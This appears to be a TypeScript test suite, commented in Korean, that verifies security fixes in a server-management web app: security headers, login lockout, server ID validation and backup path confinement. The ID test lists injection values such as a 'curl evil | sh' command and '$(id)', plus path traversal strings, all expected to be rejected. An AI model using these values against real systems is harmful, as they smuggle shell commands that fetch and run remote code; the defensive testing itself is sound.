import './helpers/env';

import assert from 'node:assert/strict';
import { test } from 'node:test';

import { app } from '../src/server';
import { writeEncryptedBackup } from '../src/services/backupCrypto';
import { resetLoginThrottle } from '../src/services/loginThrottle';
import { createServer } from '../src/features/servers/service';

/*
 * 웹 보안 점검 후속 조치 확인
 * - 보안 헤더(CSP·클릭재킹·MIME 추측 금지)
 * - 로그인 실패 반복 시 잠금
 * - 서버 ID 글자 제한(스크립트 실행 명령·백업 경로에 들어감)
 */
const login = (username: string, password = 'wrong-password') => app.inject({
  method: 'POST', url: '/api/auth/login', payload: { username, password },
});

test('화면과 API 응답에 보안 헤더를 붙인다', async () => {
  for (const url of ['/login', '/api/health']) {
    const response = await app.inject({ method: 'GET', url });
    assert.match(String(response.headers['content-security-policy']), /script-src 'self'(;|$)/, url);
    assert.match(String(response.headers['content-security-policy']), /frame-ancestors 'none'/, url);
    assert.equal(response.headers['x-frame-options'], 'DENY', url);
    assert.equal(response.headers['x-content-type-options'], 'nosniff', url);
  }
});

test('로그인 화면에는 인라인 스크립트가 없다 (CSP script-src self)', async () => {
  const response = await app.inject({ method: 'GET', url: '/login' });
  assert.doesNotMatch(response.body, /<script(?![^>]*\bsrc=)[^>]*>/);
  assert.doesNotMatch(response.body, /\son[a-z]+="/);
});

test('같은 아이디로 5번 틀리면 잠기고, 잠긴 동안에는 429와 Retry-After를 돌려준다', async () => {
  resetLoginThrottle();
  for (let i = 0; i < 5; i++) assert.equal((await login('nobody')).statusCode, 401);
  const blocked = await login('nobody');
  assert.equal(blocked.statusCode, 429);
  assert.equal(blocked.json().code, 'TOO_MANY_REQUESTS');
  assert.ok(Number(blocked.headers['retry-after']) > 0);
  // 아이디는 대소문자·앞뒤 공백을 가리지 않음
  assert.equal((await login(' NoBody ')).statusCode, 429);
  // 다른 아이디는 아직 시도할 수 있음
  assert.equal((await login('someone-else')).statusCode, 401);
});

test('같은 IP에서 여러 아이디로 20번 틀리면 IP가 잠긴다', async () => {
  resetLoginThrottle();
  for (let i = 0; i < 20; i++) assert.equal((await login(`user${i}`)).statusCode, 401);
  assert.equal((await login('fresh-user')).statusCode, 429);
  resetLoginThrottle();
});

test('서버 ID는 글자·숫자·._- 만 허용한다', () => {
  const base = { name: 'x', type: 'WEB', roles: ['OTHER'], os: 'Linux', ip: '10.0.0.1', sharedPath: '', processes: [], directories: [] };
  for (const id of ["a'; curl evil | sh; '", 'a b', '../x', '.hidden', 'a/b', 'a\\b', '$(id)', 'x'.repeat(65)]) {
    assert.throws(() => createServer({ ...base, id } as any), /서버 ID는 글자·숫자로 시작/, id);
  }
  for (const id of ['WEB-01', 'was_02.prod', '웹서버1']) {
    assert.equal(createServer({ ...base, id } as any).id, id);
  }
});

test('백업 경로가 백업 폴더 밖을 가리키면 쓰지 않는다', () => {
  assert.throws(() => writeEncryptedBackup('../../outside/x.json', Buffer.from('{}'), 'a'.repeat(64)), /백업 폴더 밖/);
  assert.throws(() => writeEncryptedBackup('2026/../../x.json', Buffer.from('{}'), 'a'.repeat(64)), /백업 폴더 밖/);
});
